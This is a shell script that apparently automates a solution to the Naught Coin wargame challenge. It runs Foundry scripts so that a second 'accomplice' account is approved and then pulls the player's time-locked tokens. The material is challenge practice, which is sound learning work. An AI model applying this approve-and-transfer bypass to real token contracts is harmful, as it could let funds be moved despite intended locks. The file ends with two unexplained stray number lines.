#!/bin/bash

# Use the first command-line argument as the RPC_URL
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Error: Missing required arguments."
    echo "Usage: $0 <RPC_URL> <ACCOUNT> <ACCOMPLICE_ACCOUNT>"
    exit 1
fi

RPC_URL="$1"
ACCOUNT="$2"
ACCOMPLICE_ACCOUNT="$3"

echo "Starting Docker containers..."
docker-compose up -d
echo "Docker containers started."

sleep 5

echo "Approving transfers from $ACCOMPLICE_ACCOUNT on behalf of $ACCOUNT ...";
cmd="docker exec -it foundry-dev forge script script/NaughtCoinApprover.s.sol --rpc-url $RPC_URL --account $ACCOUNT --password-file .password --broadcast -vvvv --tc NaughtCoinApprover";
output=$($cmd 2>&1)
exit_code=$?
if [ $exit_code -eq 0 ]; then
    echo "--- Token transfer approval successful. ---"
else
    echo "--- Token transfer approval FAILED. Check the detailed traces above for the revert reason. ---"
    echo "output: $output";
    exit 1
fi

echo "Transferring tokens from $ACCOUNT to $ACCOMPLICE_ACCOUNT ...";
cmd="docker exec -it foundry-dev forge script script/NaughtCoinAttacker.s.sol --rpc-url $RPC_URL --account $ACCOMPLICE_ACCOUNT --password-file .password --broadcast -vvvv --tc NaughtCoinAttacker";
output=$($cmd 2>&1)
exit_code=$?
if [ $exit_code -eq 0 ]; then
    echo "--- Naught Coin attack successful. ---"
else
    echo "--- Naught Coin attack FAILED. Check the detailed traces above for the revert reason. ---"
    echo "output: $output";
    exit 1
fi

echo ""
echo "Naught coin attack complete"

echo "Stopping Docker containers..."
docker-compose down
echo "Docker containers stopped."

'1000000000000000000000000'
'1000000000000000000000000'